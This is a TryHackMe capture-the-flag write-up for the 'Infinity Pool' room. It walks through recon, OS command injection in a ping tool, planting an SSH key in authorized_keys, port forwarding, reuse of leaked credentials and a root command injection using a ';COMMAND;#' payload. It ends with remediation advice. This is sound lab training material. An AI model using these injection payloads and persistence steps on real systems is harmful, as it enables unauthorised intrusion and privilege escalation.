# 🏊 TryHackMe Writeup: Infinity Pool

**Room Link:** [Infinity Pool](https://tryhackme.com/room/hh-infinitypool-5b3548af)  
**Difficulty:** Medium  
**Category:** Boot2Root, Web, Network  
**Tags:** `Command Injection`, `Port Forwarding`, `Credential Harvesting`, `API Exploitation`

---

## 📖 1. Executive Summary

The **Infinity Pool** room presents a medium-difficulty Boot2Root challenge themed around a hotel's internal management systems. The engagement starts with external reconnaissance, leading to the discovery of an exposed network diagnostic utility that suffers from a severe OS Command Injection vulnerability. 

Exploiting this flaw provides initial access to the system. Subsequent post-exploitation efforts reveal internal services restricted to localhost—specifically an operations console (Watchtower/FreePBX) and an automation service running as root. By harvesting leaked credentials and an authorization token (Bearer token) from the FreePBX dashboard, a second command injection vulnerability is exploited to achieve full root privileges.

---

## 🔍 2. Reconnaissance and Enumeration

### Port Scanning
Our first step is to identify exposed services on the target machine. We use Nmap to perform a comprehensive scan of all 65,535 TCP ports, along with service version detection.

```bash
nmap -sV -sC -p- 10.113.184.65 -oN nmap_scan.txt
```

**Nmap Output Summary:**
```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
| http-robots.txt: 2 disallowed entries 
|_/internal/ /status
|_http-title: Byte Lotus &mdash; Stay Noticed
```

The scan reveals two active services:
- **Port 22 (SSH):** Standard secure shell access. We'll need credentials or a key to use this.
- **Port 80 (HTTP):** A web application powered by Gunicorn.

Crucially, the Nmap script engine parsed the `robots.txt` file and found two restricted endpoints: `/internal/` and `/status`.

![Robots.txt output](assets/robots_txt.png)
*(Screenshot: Discovering the hidden endpoints in robots.txt)*

---

## 🔓 3. Vulnerability Identification & Initial Access

### Analyzing the Web Application
Navigating to the `/status` endpoint reveals a "Sister-property connectivity" network diagnostic tool. The application prompts the user for an IP address to execute a `ping` command. 

![Ping Diagnostic Tool](assets/ping_tool.png)
*(Screenshot: The network diagnostic web interface)*

When we submit an IP, it sends a `POST` request to `/internal/netcheck` with a `host` parameter. Network diagnostic tools that parse user input directly into system shell commands (like `ping <user_input>`) are historically prone to **OS Command Injection** if proper sanitization is absent.

### Exploiting Command Injection
By intercepting the HTTP request via a local proxy (like Burp Suite), we can manipulate the `host` parameter to include shell metacharacters (such as `;`), allowing us to append and execute arbitrary commands.

**Proof of Concept (whoami):**
```http
POST /internal/netcheck HTTP/1.1
Host: 10.113.184.65
Content-Type: application/x-www-form-urlencoded

host=127.0.0.1; whoami
```
The response returns `web`, confirming the command was executed in the context of a low-privileged service account.

### Establishing Persistence and Retrieving User Flag
Running commands blindly via HTTP is inefficient. To upgrade to a stable, interactive SSH session, we can use the command injection to append our own public SSH key to the `web` user's `authorized_keys` file.

**Step 1: Generate an SSH Keypair (on your Kali machine)**
```bash
ssh-keygen -t rsa -f infinity_pool_key
cat infinity_pool_key.pub
```

**Step 2: Inject the Public Key**
Using Burp Suite's Repeater, we inject the `echo` command to append the key:
```http
POST /internal/netcheck HTTP/1.1
Host: 10.113.184.65
Content-Type: application/x-www-form-urlencoded

host=127.0.0.1; echo 'ssh-rsa AAAAB3NzaC1... [YOUR_PUB_KEY] ... attacker@kali' >> ~/.ssh/authorized_keys
```

**Step 3: SSH Login**
With the key successfully injected, we can establish a stable SSH connection:
```bash
ssh -i infinity_pool_key web@10.113.184.65
```

Once logged in, we secure the first objective!

**User Flag:**
```bash
web@infinity-pool:~$ cat user.txt
THM{REDACTED_BY_AUTHOR}
```
*(Note: Flag is censored to comply with TryHackMe writeup guidelines.)*

![User Flag Capture](assets/user_flag.png)
*(Screenshot: Successfully retrieving the user flag via SSH)*

---

## 🚀 4. Privilege Escalation (Root)

### 4.1 Internal Network Discovery

With an interactive SSH session as the `web` user, our next goal is to escalate privileges to `root`. A critical post-exploitation step is checking for services that are only accessible from the machine itself — services bound to the loopback interface (`127.0.0.1`) that are invisible to external network scans.

We use the `ss` (socket statistics) command to list all TCP ports in a **listening** state:

```bash
web@infinity-pool:~$ ss -tln
```

**Output:**
```text
State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   Process
LISTEN   0        128            127.0.0.1:3000          0.0.0.0:*
LISTEN   0        128            127.0.0.1:8080          0.0.0.0:*
LISTEN   0        128            127.0.0.1:9000          0.0.0.0:*
LISTEN   0        128              0.0.0.0:22            0.0.0.0:*
LISTEN   0        128              0.0.0.0:80            0.0.0.0:*
```

**Analysis:**
- **Port 22** and **Port 80** are bound to `0.0.0.0` (all interfaces) — these are the SSH and HTTP services we already discovered during our initial Nmap scan.
- **Port 3000**, **Port 8080**, and **Port 9000** are bound to `127.0.0.1` (localhost only) — these are **internal services** that cannot be reached from our attack machine. They are only accessible from within the target itself.

These hidden internal services are prime targets for privilege escalation. We need a way to interact with them from our Kali browser and tools.

---

### 4.2 SSH Local Port Forwarding

Since ports 3000, 8080, and 9000 are only listening on the target's localhost, we cannot reach them directly over the network. The solution is **SSH Local Port Forwarding** — we create an SSH tunnel that maps ports on our local Kali machine to ports on the target's loopback interface.

```bash
ssh -L 3000:127.0.0.1:3000 -L 8080:127.0.0.1:8080 -L 9000:127.0.0.1:9000 -i infinity_pool_key web@10.113.184.65
```

**Breaking down the command:**
| Flag | Meaning |
|------|---------|
| `-L 3000:127.0.0.1:3000` | Forward **our** local port 3000 → target's `127.0.0.1:3000` (config API) |
| `-L 8080:127.0.0.1:8080` | Forward **our** local port 8080 → target's `127.0.0.1:8080` (FreePBX UCP) |
| `-L 9000:127.0.0.1:9000` | Forward **our** local port 9000 → target's `127.0.0.1:9000` (automation service) |
| `-i infinity_pool_key` | Use the SSH private key we generated earlier |
| `web@10.113.184.65` | Connect as the `web` user to the target |

Now, when we visit `http://127.0.0.1:3000` in our local browser, the traffic is transparently tunneled through SSH to port 3000 on the target machine's loopback interface. The same applies to ports 8080 and 9000. From the target's perspective, the requests appear to come from `127.0.0.1`, so they are accepted.

---

### 4.3 Credential Harvesting & Token Leakage (Port 3000)

#### Discovering the Configuration API

Opening `http://127.0.0.1:3000` in our browser, we begin enumerating the service for any exposed endpoints. Browsing to the `/api/config` endpoint reveals a **configuration JSON** that leaks critical internal information in plain text:

```bash
curl http://127.0.0.1:3000/api/config
```

**Output:**
```json
{
  "automation_endpoint":  "http://127.0.0.1:9000",
  "note":                 "internal network only -- do not expose",
  "ops_note":             "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_pass":       "St4yN0t1c3d_2026",
  "telephony_portal":     "http://127.0.0.1:8080/ucp",
  "telephony_user":       "FreePBXUCPTemplateCreator"
}
```

**Analysis — this single response gives us everything we need:**

| Field | Value | Significance |
|-------|-------|-------------|
| `telephony_user` | `FreePBXUCPTemplateCreator` | The username for the FreePBX UCP login |
| `telephony_pass` | `St4yN0t1c3d_2026` | The password — **never rotated** despite the ops_note warning |
| `telephony_portal` | `http://127.0.0.1:8080/ucp` | The URL of the FreePBX User Control Panel |
| `automation_endpoint` | `http://127.0.0.1:9000` | Confirms the automation service location |
| `ops_note` | *"...default template creds...ROTATE."* | An admin left a reminder to rotate credentials — but never did |
| `note` | *"internal network only -- do not expose"* | Security through obscurity — they assumed localhost = safe |

> **Key Takeaway:** The configuration API was left exposed without authentication on port 3000, leaking plaintext credentials and internal service locations. The ops team even acknowledged the risk in the `ops_note` field but failed to act on it.

#### Logging Into the FreePBX UCP (Port 8080)

The config tells us the telephony portal lives at `http://127.0.0.1:8080/ucp`. Since we also forwarded port 3000 for the config service, we need port 8080 forwarded as well. If not already tunneled, we reconnect with the additional port:

```bash
ssh -L 3000:127.0.0.1:3000 -L 8080:127.0.0.1:8080 -L 9000:127.0.0.1:9000 -i infinity_pool_key web@10.113.184.65
```

Now we navigate to `http://127.0.0.1:8080/ucp` in our browser and are presented with the **FreePBX User Control Panel** login page — an operations console branded as "Watchtower." FreePBX is an open-source web-based GUI for managing Asterisk telephony systems.

![FreePBX Login](assets/freepbx_login.png)
*(Screenshot: The internal FreePBX UCP login page)*

We log in using the credentials harvested from the config API:

**Username:** `FreePBXUCPTemplateCreator`
**Password:** `St4yN0t1c3d_2026`

✅ Login succeeds! We are now authenticated into the FreePBX User Control Panel.

#### Discovering the Automation Key in the Voicemail Inbox

After logging in, the UCP dashboard loads with several widgets. The most important one is the **Voicemail** widget (`FREEPBXUCPTEMPLATECREATOR [VOICEMAIL]`). The widget displays the voicemail inbox with the following folders:

```text
INBOX    [1]
Family   [0]
Friends  [0]
Old      [0]
Work     [0]
Urgent   [0]
```

There is **1 unread voicemail** in the INBOX. Clicking on the INBOX folder reveals the voicemail entry with the following details:

| Date/Time | CID (Caller ID) | Playback | Duration |
|-----------|-----------------|----------|----------|
| Tue, Jun 30, 2026 9:31 AM | `"Automation Key cc_auto_XXXXXXXXXXXX" <9000>` | ▶ 🔊 | 3 sec |

The **CID (Caller ID)** column contains the leaked **Automation Key** in plain text! The automation service running on port 9000 has left a voicemail that includes its own API authentication key directly in the caller ID field. The key follows the format `cc_auto_` followed by a hexadecimal string.

> **Key Takeaway:** The token is visible directly in the voicemail widget's inbox table — no need to dig through network traffic, response bodies, or hidden API endpoints. Simply log in with default credentials, open the Voicemail module, and read the INBOX. The CID field exposes the full automation key.

We copy this key — it will serve as our Bearer token for the next phase.

---

### 4.4 Exploiting the Automation Service (Port 9000)

#### Initial Reconnaissance of the API

Port 9000 hosts an internal **Automation Service** that runs with `root` privileges. We know this because the voicemail came from `<9000>`, indicating this service communicates internally. All API requests to this service require the Bearer token we just extracted from the voicemail.

Through enumeration, we discover the `/jobs/export` endpoint. Let's start probing it.

#### Attempt 1: Form-Urlencoded (Wrong Content Type)

Our first instinct is to send the data as standard form-urlencoded (the default for `curl -d`):

```bash
curl -H "Authorization: Bearer <AUTOMATION_KEY>" \
     -X POST http://127.0.0.1:9000/jobs/export \
     -d 'report=test;id'
```

**Output:**
```json
{"error":"field 'report' is required"}
```

**Analysis:** The API returns an error saying the `report` field is missing, even though we clearly sent it. This tells us two important things:
1. ✅ **Authentication works** — the Bearer token is valid (otherwise we'd get a 401/403 error).
2. ❌ **The content type is wrong** — the API does not parse `application/x-www-form-urlencoded` data. It likely expects **JSON**.

#### Attempt 2: JSON Content Type (Success!)

We retry the request with the `Content-Type: application/json` header and send the data as a JSON object:

```bash
curl -H "Authorization: Bearer <AUTOMATION_KEY>" \
     -H "Content-Type: application/json" \
     -X POST http://127.0.0.1:9000/jobs/export \
     -d '{"report":"test;id"}'
```

**Output:**
```json
{
  "command": "tar czf /var/automation/exports/test;id.tgz /var/automation/data 2>&1",
  "output": "/bin/sh: 1: id.tgz: not found\ntar: Cowardly refusing to create an empty archive\nTry 'tar --help' or 'tar --usage' for more information.\n"
}
```

This response is extremely revealing. Let's break it down:

**What the server does internally:**
The `report` parameter value is interpolated directly — without any sanitization — into a `tar` command template:

```bash
tar czf /var/automation/exports/<REPORT_VALUE>.tgz /var/automation/data 2>&1
```

So when we send `"report":"test;id"`, the server constructs and executes:

```bash
tar czf /var/automation/exports/test;id.tgz /var/automation/data 2>&1
```

**How the shell parses this (using `;` as a command separator):**
1. `tar czf /var/automation/exports/test` — tar runs but fails (incomplete archive, no source specified)
2. `id.tgz /var/automation/data 2>&1` — the shell tries to execute `id.tgz` as a command → **"not found"**

**The problem:** Our injected command `id` gets merged with the `.tgz` suffix, becoming `id.tgz` — which is not a valid command. We need a way to separate our injected command from the trailing `.tgz` filename.

#### The Solution: Using `#` to Comment Out the Trailing Suffix

In bash/sh, the `#` character marks the beginning of a **comment** — everything after it on the same line is ignored by the shell. By appending `;#` after our injected command, we can neutralize the remaining `.tgz /var/automation/data 2>&1` portion.

**The injection pattern:**
```text
test;COMMAND;#
```

**Which the server expands to:**
```bash
tar czf /var/automation/exports/test;COMMAND;#.tgz /var/automation/data 2>&1
```

**How the shell now parses it:**
1. `tar czf /var/automation/exports/test` — tar fails (harmless)
2. `COMMAND` — ✅ **our injected command runs cleanly**
3. `#.tgz /var/automation/data 2>&1` — 💤 **commented out, completely ignored**

#### Step 1: Confirm Command Execution as Root

Let's verify this technique works and confirm we're running as `root`:

```bash
curl -H "Authorization: Bearer <AUTOMATION_KEY>" \
     -H "Content-Type: application/json" \
     -X POST http://127.0.0.1:9000/jobs/export \
     -d '{"report":"test;id;#"}'
```

**Output:**
```json
{
  "command": "tar czf /var/automation/exports/test;id;#.tgz /var/automation/data 2>&1",
  "output": "tar: Cowardly refusing to create an empty archive\nTry 'tar --help' or 'tar --usage' for more information.\nuid=0(root) gid=0(root) groups=0(root)\n"
}
```

✅ **Confirmed!** The `id` command returns `uid=0(root)` — the automation service is executing our commands as the **root** user.

#### Step 2: Retrieve the Root Flag

With confirmed root-level command execution, we read the root flag:

```bash
curl -H "Authorization: Bearer <AUTOMATION_KEY>" \
     -H "Content-Type: application/json" \
     -X POST http://127.0.0.1:9000/jobs/export \
     -d '{"report":"test;cat /root/root.txt;#"}'
```

**Output:**
```json
{
  "command": "tar czf /var/automation/exports/test;cat /root/root.txt;#.tgz /var/automation/data 2>&1",
  "output": "tar: Cowardly refusing to create an empty archive\n...\nTHM{REDACTED_BY_AUTHOR}\n"
}
```

**Root Flag:**
```text
THM{REDACTED_BY_AUTHOR}
```
*(Note: The root flag value is intentionally redacted to comply with TryHackMe writeup guidelines.)*

🏁 **Machine fully compromised — both user and root flags captured!**

![Root Flag Capture](assets/root_flag.png)
*(Screenshot: Executing the curl command and retrieving the root flag)*

---

## 🛡️ 5. Remediation & Key Takeaways

1.  **Input Sanitization:** OS Command Injection is a fatal flaw — and it appeared **twice** in this engagement (the `/internal/netcheck` endpoint and the `/jobs/export` endpoint). Developers should never pass user input directly to system shell commands. Use built-in libraries (e.g., native ping functions, tar libraries) instead of OS calls. If shell commands are unavoidable, input must be strictly whitelisted and sanitized.
2.  **Principle of Least Privilege:** The automation service on port 9000 ran as `root`. Even internal services should run with the minimum permissions required to perform their task. If it doesn't strictly need root, don't run it as root.
3.  **Exposed Configuration APIs:** The `/api/config` endpoint on port 3000 was accessible without authentication and leaked plaintext credentials, internal service URLs, and operational notes. Internal APIs must still require authentication — being bound to localhost is not sufficient security.
4.  **Unrotated Credentials:** The ops team left a note (`ops_note`) acknowledging that default template credentials needed to be rotated — but never followed through. Credential rotation policies must be enforced, not just documented.
5.  **Sensitive Data in Voicemail CID:** The automation service leaked its own Bearer token via a voicemail's Caller ID field. Sensitive tokens and API keys should never be transmitted through communication channels (voicemail, email, SMS) where they can be read by unauthorized users.
